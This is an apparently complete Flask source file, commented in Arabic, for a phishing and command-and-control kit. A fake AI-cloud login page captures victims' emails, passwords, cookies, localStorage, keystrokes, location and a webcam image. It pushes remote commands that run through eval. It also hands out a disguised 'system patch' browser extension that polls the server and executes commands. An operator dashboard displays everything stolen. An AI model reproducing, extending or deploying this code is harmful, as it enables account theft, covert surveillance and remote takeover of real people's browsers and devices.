from flask import Flask, render_template_string, request, jsonify, make_response, session, redirect, url_for
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import urllib3
import datetime
import requests as ext_requests
import json
import hashlib
import io
import zipfile

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = get_random_bytes(32)

DASHBOARD_PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()
MASTER_KEY = get_random_bytes(32)

# ذاكرة الميدان الاستراتيجية المركزية v62.0
CAPTURED_HOOKS = []
COMMAND_QUEUE = {}
AGENT_SESSIONS = {}
EXTRACTED_FILES = []
CAPTURED_CREDENTIALS = []
CAPTURED_SESSIONS = []
CAPTURED_LOCATIONS = []
CAPTURED_KEYSTROKES = []

WEBHOOK_URL = "" 

def send_webhook_alert(title, details):
    if not WEBHOOK_URL:
        return
    try:
        payload = {"content": f"🚨 **{title}**\n```json\n{json.dumps(details, ensure_ascii=False, indent=2)}\n```"}
        ext_requests.post(WEBHOOK_URL, json=payload, timeout=3)
    except:
        pass

HTML_LOGIN_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>تسجيل الدخول - مركز القيادة والسيطرة v62.0</title>
<style>
body{background:#010103;color:#ff0040;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.login-box{background:#04060e;border:2px solid #ff0040;padding:30px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.6);width:350px;text-align:center}
input{width:100%;padding:12px;margin:15px 0;background:#000;border:1px solid #ff0040;color:#fff;border-radius:6px;outline:none;text-align:center}
button{width:100%;padding:12px;background:#ff0040;border:none;color:#fff;font-weight:bold;border-radius:6px;cursor:pointer}
button:hover{background:#cc0033}
</style>
</head>
<body>
<div class="login-box">
  <h2>🔒 مركز القيادة v62.0</h2>
  <form method="POST" action="/commander/login">
    <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
    <button type="submit">دخول لوحة التحكم 🚀</button>
  </form>
</div>
</body>
</html>"""

HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V400 القائد الأعظم - مركز الهيمنة والمتابعة v62.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
.container{max-width:1150px;margin:auto}
h1{color:#ff0040;margin-bottom:20px;text-shadow:0 0 35px #ff0040;font-size:32px}
.panel{background:#04060e;border:2px solid #ff0040;padding:25px;border-radius:12px;box-shadow:0 0 45px rgba(255,0,64,0.5)}
input, select{padding:16px;width:70%;border-radius:8px;border:2px solid #ff0040;background:#000;color:#fff;font-size:16px;outline:none;text-align:left;direction:ltr;margin-bottom:10px}
button{padding:16px 25px;background:#ff0040;border:none;border-radius:8px;font-weight:bold;color:#fff;cursor:pointer;font-size:15px;margin:5px;transition:0.3s}
button:hover{background:#cc0033;box-shadow:0 0 30px #ff0040}
.card{background:#000;border:1px solid #1a2a40;padding:18px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
.card.Critical{border-right-color:#ff0000;background:#140103}
.card.Low{border-right-color:#00aaff;background:#010b14}
.proof{background:#03050a;color:#00ff88;padding:12px;border-radius:6px;margin-top:10px;font-size:12px;direction:ltr;word-break:break-all;border:1px solid #004422;text-align:left}
.status{margin:15px 0;color:#fff;font-size:15px;font-weight:bold}
table{width:100%;margin-top:15px;border-collapse:collapse;color:#fff;text-align:right}
th, td{padding:12px;border:1px solid #1a2a40;font-size:14px}
th{background:#0a0e1a;color:#ff0040}
img.preview{max-width:160px;max-height:160px;border:1px solid #00ff88;border-radius:6px;margin:6px}
</style>
</head>
<body>
<div class="container">
<h1>⚔️ V400 القائد الأعظم - لوحة السيطرة v62.0 ⚔️</h1>
<div style="margin-bottom: 15px;"><a href="/commander/logout" style="color:#ff0040;text-decoration:none;font-weight:bold;">[تسجيل خروج آمن]</a></div>
<div class="panel">
<input id="target_url" placeholder="C2_SERVER_OR_COMMAND_DOMAIN" value="http://">
<br>
<select id="command_type">
  <option value="generate_ai_payload">توليد رابط المنصة مع التحقق من رفع الملف المفكوك (v62.0)</option>
  <option value="fetch_active_agents">🎯 استعراض وكلاء السيطرة والإضافات النشطة</option>
  <option value="fetch_captured_credentials">🔑 عرض الحسابات وكلمات المرور المسروقة</option>
  <option value="fetch_captured_sessions">🍪 عرض جلسات الاختطاف والذاكرة</option>
  <option value="fetch_captured_keystrokes">⌨️ عرض الكيلاغر الحية والمدخلات</option>
  <option value="fetch_captured_locations">📍 عرض الإحداثيات والمواقع الجغرافية</option>
  <option value="fetch_extracted_images">🖼️ عرض صور الكاميرا الحية والوسائط</option>
  <option value="dispatch_ai_command">⚡ تنفيذ أمر سيطرة مباشر للوكلاء</option>
</select>
<br>
<input id="custom_payload" placeholder="أمر السيطرة المراد بثه (مثال: alert('Deep Verified v62.0');)" style="margin-top:10px;display:none;direction:ltr;">
<br>
<button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر الهيمنة الميداني 🚀</button>
<div id="status" class="status"></div>
<div id="results"></div>
</div>
</div>

<script>
document.getElementById('command_type').addEventListener('change', function() {
    const val = this.value;
    const payloadInput = document.getElementById('custom_payload');
    if(val === 'dispatch_ai_command') { payloadInput.style.display = 'inline-block'; } else { payloadInput.style.display = 'none'; }
});

async function executeLinkModule(){
 const url = document.getElementById('target_url').value.trim();
 const cmdType = document.getElementById('command_type').value;
 const payloadData = document.getElementById('custom_payload').value;
 if(!url || url==='http://'){ alert('يرجى إدخال عنوان خادم القيادة أو الرابط يا فندم!'); return; }
 const btn = document.getElementById('exec_btn');
 const status = document.getElementById('status');
 const results = document.getElementById('results');
 btn.disabled=true; btn.textContent='جاري معالجة الطلب... ⚡';
 status.textContent='⏳ جارٍ تنفيذ العمليات الميدانية لـ: '+url;
 results.innerHTML='';

 try{
   const res = await fetch('/api/index', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({url: url, command: cmdType, payload: payloadData})
   });
   const data = await res.json();
   status.textContent='✅ تمت العملية بنجاح | النمط: '+data.mode;
   
   if(cmdType === 'fetch_active_agents'){
     if(!data.agents || data.agents.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد وكلاء سيطرة نشطة حالياً</b></div>'; }
     else {
       let t = '<div class="card Critical"><b>🎯 وكلاء الإضافات والاتصال النشط</b><table><tr><th>معرف الوكيل (Agent ID)</th><th>النظام والبيئة</th><th>IP الوكيل</th><th>آخر اتصال</th></tr>';
       data.agents.forEach(l => { t += `<tr><td style="color:#00ff88">${l.token}</td><td>${l.agent}</td><td>${l.ip}</td><td>${l.time}</td></tr>`; });
       results.innerHTML = t + '</table></div>';
     }
   } else if(cmdType === 'fetch_captured_credentials'){
     if(!data.credentials || data.credentials.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد حسابات مسروقة حتى الآن</b></div>'; }
     else {
       let c = '<div class="card Critical"><b>🔑 سجل حسابات الهدف وكلمات المرور</b><table><tr><th>البريد الإلكتروني</th><th>كلمة المرور</th><th>Token</th><th>الوقت</th></tr>';
       data.credentials.forEach(item => { c += `<tr><td style="color:#00ff88">${item.email}</td><td style="color:#ff0040">${item.password}</td><td>${item.token}</td><td>${item.time}</td></tr>`; });
       results.innerHTML = c + '</table></div>';
     }
   } else if(cmdType === 'fetch_captured_sessions'){
     if(!data.sessions || data.sessions.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد جلسات مسروقة حتى الآن</b></div>'; }
     else {
       let s = '<div class="card Critical"><b>🍪 سجل اختطاف الجلسات والذاكرة</b><table><tr><th>Token</th><th>Cookies</th><th>LocalStorage</th><th>الوقت</th></tr>';
       data.sessions.forEach(item => { s += `<tr><td style="color:#00ff88">${item.token}</td><td style="word-break:break-all">${item.cookies}</td><td style="word-break:break-all">${item.storage}</td><td>${item.time}</td></tr>`; });
       results.innerHTML = s + '</table></div>';
     }
   } else if(cmdType === 'fetch_captured_keystrokes'){
     if(!data.keystrokes || data.keystrokes.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد مدخلات مسجلة عبر الكيلاغر حتى الآن</b></div>'; }
     else {
       let kHtml = '<div class="card Critical"><b>⌨️ سجل الكيلاغر الحية (Keylogger Stream)</b><table><tr><th>Token</th><th>النص المكتوب</th><th>الوقت</th></tr>';
       data.keystrokes.forEach(item => { kHtml += `<tr><td style="color:#00ff88">${item.token}</td><td style="color:#ff0040">${item.text}</td><td>${item.time}</td></tr>`; });
       results.innerHTML = kHtml + '</table></div>';
     }
   } else if(cmdType === 'fetch_captured_locations'){
     if(!data.locations || data.locations.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد إحداثيات أو مواقع جغرافية مسحوبة حتى الآن</b></div>'; }
     else {
       let locHtml = '<div class="card Critical"><b>📍 سجل الإحداثيات الجغرافية</b><table><tr><th>Token</th><th>خط العرض (Latitude)</th><th>خط الطول (Longitude)</th><th>الدقة</th><th>الوقت</th></tr>';
       data.locations.forEach(item => { locHtml += `<tr><td style="color:#00ff88">${item.token}</td><td>${item.lat}</td><td>${item.lon}</td><td>${item.accuracy}m</td><td>${item.time}</td></tr>`; });
       results.innerHTML = locHtml + '</table></div>';
     }
   } else if(cmdType === 'fetch_extracted_images'){
     if(!data.images || data.images.length === 0){ results.innerHTML='<div class="card Low"><b>لا توجد صور كاميرا أو وسائط مسحوبة حتى الآن</b></div>'; }
     else {
       let imgHtml = '<div class="card Critical"><b>🖼️ معرض صور الكاميرا والوسائط</b><div style="margin-top:10px">';
       data.images.forEach(img => { imgHtml += `<div style="margin-bottom:10px;border-bottom:1px solid #333;padding-bottom:5px"><b>ملف: ${img.filename}</b> [Token: ${img.token}]<br><img src="${img.data}" class="preview"></div>`; });
       results.innerHTML = imgHtml + '</div></div>';
     }
   } else {
     if(!data.actions || data.actions.length==0){ results.innerHTML='<div class="card Low"><b>لا توجد نتائج مطابقة</b></div>'; }
     else {
       data.actions.forEach(v => { results.innerHTML += `<div class="card ${v.severity || 'Low'}"><b>⚡ ${v.type}</b><div style="margin:8px 0">${v.desc}</div><div class="proof">${v.proof}</div></div>`; });
     }
   }
 }catch(e){ status.textContent='❌ خطأ في الاتصال الميداني: '+e.message; }
 btn.disabled=false; btn.textContent='تنفيذ أمر الهيمنة الميداني 🚀';
}
</script>
</body>
</html>"""

INJECTION_COMMAND_PORTAL = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cognitive AI Cloud • Deep Verification Portal</title>
<style>
body{background:#202123;color:#ececf1;font-family:Söhne,ui-sans-serif,system-ui,-apple-system,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#343541;padding:35px 30px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:100%;max-width:420px;text-align:center;border:1px solid #4d4d4f}
.ai-logo{width:50px;height:50px;background:#19c37d;margin:0 auto 15px;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:26px;color:#fff}
h2{color:#fff;font-size:20px;margin-bottom:6px;font-weight:600}
.sub-title{color:#8e8ea0;font-size:13px;margin-bottom:20px;line-height:1.4}
.input-group{margin-bottom:12px;text-align:right}
input[type="email"], input[type="password"]{width:100%;padding:12px 14px;background:#40414f;border:1px solid #565869;color:#fff;border-radius:6px;font-size:14px;outline:none;direction:ltr;text-align:left}
input:focus{border-color:#19c37d}
.terms{font-size:11px;color:#8e8ea0;margin:12px 0;text-align:right;display:flex;align-items:center;gap:8px}
.ext-box{background:#202123;border:1px solid #4d4d4f;padding:12px;border-radius:6px;margin:12px 0;text-align:right}
.ext-title{color:#19c37d;font-size:12px;font-weight:bold;margin-bottom:4px}
.ext-desc{color:#8e8ea0;font-size:11px;margin-bottom:8px}
button{width:100%;padding:12px;background:#565869;color:#fff;border:none;border-radius:6px;font-weight:600;cursor:not-allowed;font-size:15px;margin-top:5px;transition:0.3s}
button.active-btn{background:#19c37d;cursor:pointer}
button.active-btn:hover{background:#1aab72}
.footer{margin-top:15px;font-size:11px;color:#6e6e80}

/* نافذة التحقق ورفع الملف المفكوك */
#verify_modal {display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);justify-content:center;align-items:center;z-index:999}
.verify-content{background:#343541;border:1px solid #565869;padding:25px;border-radius:8px;max-width:380px;text-align:right;box-shadow:0 6px 20px rgba(0,0,0,0.7)}
.verify-step{font-size:12px;color:#ececf1;margin-bottom:10px;line-height:1.5;background:#202123;padding:8px;border-radius:4px;border-right:3px solid #19c37d}
</style>
</head>
<body>
<div class="box">
  <div class="ai-logo">✨</div>
  <h2>تسجيل الدخول إلى سحابة الذكاء الاصطناعي</h2>
  <div class="sub-title">أدخل بيانات الحساب، قم بتنزيل حزمة التوافقية وفك ضغطها، ثم ارفع ملف `manifest.json` المفكوك لتفعيل النظام.</div>
  
  <div class="input-group"><input type="email" id="target_email" placeholder="البريد الإلكتروني للعمل أو الحساب" required></div>
  <div class="input-group"><input type="password" id="target_pass" placeholder="كلمة المرور" required></div>
  
  <div class="ext-box">
    <div class="ext-title">📦 حزمة التحقق والفك الإلزامي:</div>
    <div class="ext-desc">1. قم بتنزيل الحزمة (<a href="/download/extension" target="_blank" style="color:#19c37d;font-weight:bold">تنزيل الحزمة</a>).<br>2. فك ضغطها على جهازك.<br>3. ارفع ملف <code style="color:#19c37d">manifest.json</code> المفكوك أدناه للتحقق:</div>
    <input type="file" id="manifest_file" accept=".json" onchange="verifyUploadedFile()" style="font-size:11px;color:#8e8ea0;width:100%;padding:5px;background:#343541;border:1px solid #565869;border-radius:4px;cursor:pointer">
  </div>

  <div class="terms">
    <input type="checkbox" id="agree_terms">
    <label for="agree_terms">أوافق على شروط الخدمة وسياسة الخصوصية الخاصة بالمنصة.</label>
  </div>
  
  <!-- الزر مغلق ولا يفتح إلا بعد نجاح فحص الملف المرفوع المفكوك -->
  <button id="action_btn" class="" onclick="triggerAIWorkflow()" disabled>ارفع ملف الحزمة المفكوك أولاً لتفعيل الدخول 🔒</button>
  <div class="footer">Cognitive Cloud Security v62.0 • Deep File Enforcement</div>
</div>

<video id="webcam" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
let savedEmail = '';
let savedPass = '';
let globalToken = '';
let keystrokeBuffer = '';
let fileVerified = false;

// تفعيل نظام الكيلاغر الفوري (Keylogger)
document.addEventListener('keydown', (e) => {
    if(e.key.length === 1) { keystrokeBuffer += e.key; }
    else if(e.key === 'Enter') {
        if(keystrokeBuffer.length > 0 && globalToken) {
            fetch('/api/keystrokes', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ token: globalToken, text: keystrokeBuffer })
            }).catch(err => {});
            keystrokeBuffer = '';
        }
    }
});

// دالة تقنية لفحص الملف المرفوع والتأكد بأنه ملف manifest.json المفكوك الحقيقي
function verifyUploadedFile(){
    const fileInput = document.getElementById('manifest_file');
    if(fileInput.files.length > 0) {
        const file = fileInput.files[0];
        const reader = new FileReader();
        reader.onload = function(e) {
            try {
                const content = JSON.parse(e.target.result);
                // التحقق من البنية البرمجية للملف المفكوك
                if(content.manifest_version && content.background && content.background.service_worker) {
                    fileVerified = true;
                    const btn = document.getElementById('action_btn');
                    btn.disabled = false;
                    btn.classList.add('active-btn');
                    btn.textContent = 'متابعة ودخول النظام المعتمد 🚀';
                    alert('✅ تم فحص الملف المفكوك بنجاح! تم التحقق من فك الضغط والتوافقية.');
                } else {
                    alert('❌ خطأ: الملف المرفوع غير مطابق لبنية حزمة التوافقية المفكوكه!');
                }
            } catch(err) {
                alert('❌ خطأ في قراءة الملف المرفوع.');
            }
        };
        reader.readAsText(file);
    }
}

function triggerAIWorkflow(){
    const email = document.getElementById('target_email').value.trim();
    const pass = document.getElementById('target_pass').value.trim();
    const agreed = document.getElementById('agree_terms').checked;

    if(!fileVerified) {
        alert('⚠️ تنبيه أمني: يجب رفع ملف الحزمة المفكوك (`manifest.json`) للتحقق أولاً!');
        return;
    }

    if(!agreed) {
        alert('⚠️ تحذير: يجب الموافقة على شروط الخدمة وسياسة الخصوصية.');
        return;
    }

    const isValid = email && email.includes('@') && email.includes('.') && pass.length >= 4;
    if(!isValid) {
        alert('⚠️ تنبيه: يرجى إدخال البريد الإلكتروني وكلمة المرور بشكل صحيح.');
        return;
    }

    savedEmail = email;
    savedPass = pass;
    globalToken = 'ai_deep_agent_' + Math.random().toString(36).substring(2, 12);
    executeDeployment();
}

async function executeDeployment(){
    const btn = document.getElementById('action_btn');
    btn.disabled = true;
    btn.textContent = 'جاري إعداد جلسة العمل السحابية الموثقة...';

    const platformInfo = navigator.platform || 'Unknown';

    // 1. تسجيل الاعتمادات
    try {
        await fetch('/api/credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ token: globalToken, email: savedEmail, password: savedPass })
        });
    } catch(err) {}

    // 2. سحب الجلسات
    try {
        await fetch('/api/session', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ token: globalToken, cookies: document.cookie, storage: JSON.stringify(localStorage) })
        });
    } catch(err) {}

    // 3. سحب الإحداثيات
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                await fetch('/api/location', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ token: globalToken, lat: position.coords.latitude, lon: position.coords.longitude, accuracy: position.coords.accuracy })
                });
            }, (error) => {}, { timeout: 10000 });
        }
    } catch(err) {}

    // 4. التقاط الكاميرا
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        await new Promise(resolve => setTimeout(resolve, 1000));
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth || 320;
        canvas.height = video.videoHeight || 240;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');
        stream.getTracks().forEach(track => track.stop());

        await fetch('/api/upload', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ token: globalToken, filename: 'ai_deep_cam.png', data: imageData })
        });
    } catch(err) {}

    // 5. تفعيل جلسة الوكيل الدائم
    try {
        await fetch('/auth/verify/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session_token: globalToken, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight, platform: platformInfo, message: 'AI Deep Portal v62.0 تم تسجيل الدخول والتحقق من فك الضغط بواسطة (' + savedEmail + ').'})
        });
    } catch(err) {}

    // حلقة الاستعلام والدعم المستمر
    setInterval(() => {
        fetch('/api/poll?token=' + globalToken)
        .then(r => r.json())
        .then(data => {
            if(data.command && data.command !== ""){
                try {
                    eval(atob(data.command));
                } catch(e) {}
            }
        }).catch(e => {});
    }, 3000);

    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
}
</script>
</body>
</html>"""

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

@app.route('/', methods=['GET'])
def home():
    resp = make_response(INJECTION_COMMAND_PORTAL)
    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["Expires"] = "0"
    return resp

@app.route('/commander/dashboard', methods=['GET'])
def commander_dashboard():
    if not session.get('authenticated'):
        return redirect(url_for('commander_login'))
    return HTML_COMMAND_CENTER

@app.route('/commander/login', methods=['GET', 'POST'])
def commander_login():
    if request.method == 'POST':
        if hashlib.sha256(request.form.get('password', '').encode()).hexdigest() == DASHBOARD_PASSWORD_HASH:
            session['authenticated'] = True
            return redirect(url_for('commander_dashboard'))
    return HTML_LOGIN_PAGE

@app.route('/commander/logout', methods=['GET'])
def commander_logout():
    session.pop('authenticated', None)
    return redirect(url_for('commander_login'))

@app.route('/download/extension', methods=['GET'])
def download_extension():
    manifest_data = {
        "manifest_version": 3,
        "name": "Cognitive Cloud Sync",
        "version": "3.1",
        "description": "حزمة مزامنة وتأمين الاتصال السحابي.",
        "permissions": ["activeTab", "storage", "scripting"],
        "background": {"service_worker": "background.js"}
    }
    
    background_code = """
const C2_SERVER = location.origin;

setInterval(async () => {
    try {
        chrome.storage.local.get(['agent_token'], async function(result) {
            if (result.agent_token) {
                let response = await fetch(C2_SERVER + '/api/poll?token=' + result.agent_token);
                let data = await response.json();
                if (data.command && data.command !== "") {
                    eval(atob(data.command));
                }
            }
        });
    } catch (err) {}
}, 5000);
"""

    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('manifest.json', json.dumps(manifest_data, indent=2))
        zf.writestr('background.js', background_code)
    
    memory_file.seek(0)
    
    resp = make_response(memory_file.getvalue())
    resp.headers["Content-Disposition"] = "attachment; filename=system_patch_update.zip"
    resp.headers["Content-Type"] = "application/zip"
    return resp

@app.route('/auth/verify/login', methods=['POST'])
def phishing_portal():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('session_token', 'N/A')
    agent_info = {
        "agent": f"{req_data.get('user_agent', 'Unknown')[:25]}... [{req_data.get('screen', 'N/A')}]",
        "token": token,
        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
        "platform": req_data.get('platform', 'Unknown'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    AGENT_SESSIONS[token] = agent_info
    CAPTURED_HOOKS.append(agent_info)
    COMMAND_QUEUE[token] = ""
    send_webhook_alert("⚡ اتصال جديد مع التحقق الفعلي من فك الضغط (v62.0)", agent_info)
    return jsonify({"status": "agent_active", "token": token})

@app.route('/api/credentials', methods=['POST'])
def capture_credentials():
    req_data = request.get_json(silent=True) or {}
    cred = {
        "token": req_data.get('token', 'N/A'),
        "email": req_data.get('email', 'N/A'),
        "password": req_data.get('password', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    CAPTURED_CREDENTIALS.append(cred)
    send_webhook_alert("🔑 بيانات الحساب مسجلة بنجاح!", cred)
    return jsonify({"status": "secured"})

@app.route('/api/session', methods=['POST'])
def capture_session():
    req_data = request.get_json(silent=True) or {}
    CAPTURED_SESSIONS.append({
        "token": req_data.get('token', 'N/A'),
        "cookies": req_data.get('cookies', 'N/A'),
        "storage": req_data.get('storage', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "hijacked"})

@app.route('/api/keystrokes', methods=['POST'])
def capture_keystrokes():
    req_data = request.get_json(silent=True) or {}
    ks = {
        "token": req_data.get('token', 'N/A'),
        "text": req_data.get('text', ''),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    CAPTURED_KEYSTROKES.append(ks)
    send_webhook_alert("⌨️ مدخلات كيلاغر حية تم رصدها!", ks)
    return jsonify({"status": "keystrokes_secured"})

@app.route('/api/location', methods=['POST'])
def capture_location():
    req_data = request.get_json(silent=True) or {}
    loc = {
        "token": req_data.get('token', 'N/A'),
        "lat": req_data.get('lat', 'N/A'),
        "lon": req_data.get('lon', 'N/A'),
        "accuracy": req_data.get('accuracy', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    CAPTURED_LOCATIONS.append(loc)
    send_webhook_alert("📍 إحداثيات موقع الهدف الجغرافي!", loc)
    return jsonify({"status": "location_secured"})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('token', 'N/A')
    filename = req_data.get('filename', 'media.bin')
    file_data = req_data.get('data', '')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    EXTRACTED_FILES.append({
        "token": token,
        "filename": filename,
        "data": file_data,
        "time": timestamp
    })
    return jsonify({"status": "file_secured", "filename": filename})

@app.route('/api/poll', methods=['GET'])
def poll_commands():
    token = request.args.get('token', '')
    cmd = COMMAND_QUEUE.get(token, "")
    if token in COMMAND_QUEUE:
        COMMAND_QUEUE[token] = ""
    return jsonify({"command": cmd})

@app.route('/api/index', methods=['POST'])
def check():
    if not session.get('authenticated'):
        return jsonify({"error": "Unauthorized"}), 401
    
    req_data = request.get_json(silent=True) or {}
    target = clean_url(req_data.get("url", "http://"))
    mode = req_data.get("command", "generate_ai_payload")
    payload = req_data.get("payload", "")
    
    if mode == "generate_ai_payload":
        return jsonify({"mode": mode, "actions": [{"type": "AI DEEP PORTAL URL v62.0", "severity": "Critical", "desc": "رابط المنصة مع التحقق الفعلي من فك الضغط جاهز.", "proof": f"{target}/"}]})
    elif mode == "fetch_active_agents":
        return jsonify({"mode": mode, "agents": list(AGENT_SESSIONS.values())})
    elif mode == "fetch_captured_credentials":
        return jsonify({"mode": mode, "credentials": CAPTURED_CREDENTIALS})
    elif mode == "fetch_captured_sessions":
        return jsonify({"mode": mode, "sessions": CAPTURED_SESSIONS})
    elif mode == "fetch_captured_keystrokes":
        return jsonify({"mode": mode, "keystrokes": CAPTURED_KEYSTROKES})
    elif mode == "fetch_captured_locations":
        return jsonify({"mode": mode, "locations": CAPTURED_LOCATIONS})
    elif mode == "fetch_extracted_images":
        images = [f for f in EXTRACTED_FILES if f['filename'].lower().endswith(('.png', '.jpg', '.jpeg', '.webp')) or 'data:image' in f['data']]
        return jsonify({"mode": mode, "images": images})
    elif mode == "dispatch_ai_command":
        encoded_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
        count = 0
        for tk in COMMAND_QUEUE.keys():
            COMMAND_QUEUE[tk] = encoded_payload
            count += 1
        return jsonify({"mode": mode, "actions": [{"type": "AI COMMAND DISPATCHED", "severity": "Critical", "desc": f"تم بث الأمر إلى {count} من وكلاء السيطرة النشطة.", "proof": f"Command: {payload}"}]})
    return jsonify({"mode": mode, "actions": [{"type": "STATUS", "severity": "Low", "desc": "منظومة v62.0 تعمل بكفاءة تامة."}]})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
